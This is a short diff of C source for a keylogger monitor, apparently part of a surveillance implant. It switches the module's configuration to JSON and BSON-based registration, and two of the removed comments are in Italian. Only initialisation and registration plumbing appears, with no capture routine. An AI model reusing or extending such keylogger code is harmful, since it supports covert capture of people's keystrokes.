@@ -696,20 +696,14 @@ DWORD __stdcall PM_KeyLogStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD __stdcall PM_KeyLogInit(BYTE *conf_ptr, BOOL bStartFlag)
+DWORD __stdcall PM_KeyLogInit(JSONObject elem)
 {
 	memset(kbuf, 0, sizeof(kbuf));
-	PM_KeyLogStartStop(bStartFlag, TRUE);
 	return 1;
 }
 
 
 void PM_KeyLogRegister()
 {
-	// Non ha nessuna funzione di Dispatch
-	AM_MonitorRegister(PM_KEYLOGAGENT, (BYTE *)PM_KeyLogDispatch, (BYTE *)PM_KeyLogStartStop, (BYTE *)PM_KeyLogInit, NULL);
-
-	// Inizialmente i monitor devono avere una configurazione di default nel caso
-	// non siano referenziati nel file di configurazione (partono comunque come stoppati).
-	PM_KeyLogInit(NULL, FALSE);
+	AM_MonitorRegisterBSON(L"keylog", PM_KEYLOGAGENT, (BYTE *)PM_KeyLogDispatch, (BYTE *)PM_KeyLogStartStop, (BYTE *)PM_KeyLogInit, NULL);
 }
